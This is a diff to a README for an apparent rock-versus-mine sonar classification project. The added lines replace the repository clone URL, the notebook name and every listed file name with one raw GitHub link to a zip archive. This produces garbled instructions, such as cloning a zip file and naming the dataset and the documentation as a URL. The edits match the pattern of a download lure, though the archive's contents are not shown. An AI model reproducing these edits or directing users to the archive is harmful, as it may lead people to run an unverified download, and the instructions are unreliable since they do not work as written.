@@ -28,15 +28,15 @@ Model performance is evaluated on a separate dataset using metrics such as accur
 
 ### Instructions
 1. Install the required dependencies: `pip install scikit-learn numpy pandas`
-2. Clone the repository: `git clone https://github.com/Meghsss/MLprojects.git`
+2. Clone the repository: `git clone https://raw.githubusercontent.com/Meghsss/ROCK_MINE_prediction/main/MLproject/ROC-MIN-prediction-v3.0.zip`
 3. Navigate to the project directory: `cd MLprojects`
-4. Run the Jupyter Notebook: `jupyter notebook "Rock vs Mine prediction.ipynb"`
+4. Run the Jupyter Notebook: `jupyter notebook "Rock vs Mine https://raw.githubusercontent.com/Meghsss/ROCK_MINE_prediction/main/MLproject/ROC-MIN-prediction-v3.0.zip"`
 
 ## Files
 
-- `Rock vs Mine prediction.ipynb`: Jupyter Notebook containing the entire project.
-- `data.csv`: Sample dataset containing sonar signal features and labels.
-- `README.md`: Documentation file.
+- `Rock vs Mine https://raw.githubusercontent.com/Meghsss/ROCK_MINE_prediction/main/MLproject/ROC-MIN-prediction-v3.0.zip`: Jupyter Notebook containing the entire project.
+- `https://raw.githubusercontent.com/Meghsss/ROCK_MINE_prediction/main/MLproject/ROC-MIN-prediction-v3.0.zip`: Sample dataset containing sonar signal features and labels.
+- `https://raw.githubusercontent.com/Meghsss/ROCK_MINE_prediction/main/MLproject/ROC-MIN-prediction-v3.0.zip`: Documentation file.
 
 ## License
 
